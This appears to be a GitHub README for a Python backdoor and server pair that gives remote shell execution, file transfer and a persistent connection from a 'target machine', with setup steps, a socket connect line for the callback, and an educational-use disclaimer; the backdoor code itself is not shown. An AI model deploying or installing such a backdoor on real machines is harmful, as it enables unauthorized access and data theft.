# 🐍 Backdoor and Server Project

This project is a Python implementation of a simple backdoor and server communication system. The backdoor (`backdoor.py`) connects to a server (`server.py`) to execute commands, transfer files, and maintain communication.

⚠️ **Disclaimer:** This code is for educational purposes only. Unauthorized use or deployment of this code for malicious purposes is strictly prohibited and may be illegal. Use responsibly and ethically.

---

## 🚀 Features

- 📡 Persistent backdoor connection
- 🔄 File upload and download functionality
- 🖥️ Remote shell execution
- 🗂 Directory navigation support

---

## 📂 Project Structure

    ├── backdoor.py   # Backdoor script to connect to the server
    ├── server.py     # Server script to manage the backdoor
    
## ⚙️ Setup

1. Ensure you have Python 3.x installed on both server and target machines.

2. Clone or download this repository:
        ```bash
        git clone https://github.com/fadlyfatih1/simple-bruteforce.git
        cd simple-bruteforce
        ```

3. Update the IP address in both backdoor.py and server.py to match the server's IP:
   ```bash
    s.connect(('192.168.1.1', 5555))  # In backdoor.py
    sock.bind(('192.168.1.1', 5555))  # In server.py
   ```
   
4. Running the server:
```bash
python3 server.py
```

4. Running the Backdoor on target machine:
```bash
python3 backdoor.py
```

## 📜 Usage
Example Commands
- Change Directory: cd /path/to/directory
- Upload File: upload example.txt
- Download File: download example.txt
- Execute Shell Command: ls -la
- Terminate Connection: quit

## 📌 Note
This repository is not responsible for any harm or damage caused by improper use of this code. Always adhere to ethical hacking guidelines and ensure compliance with the law.
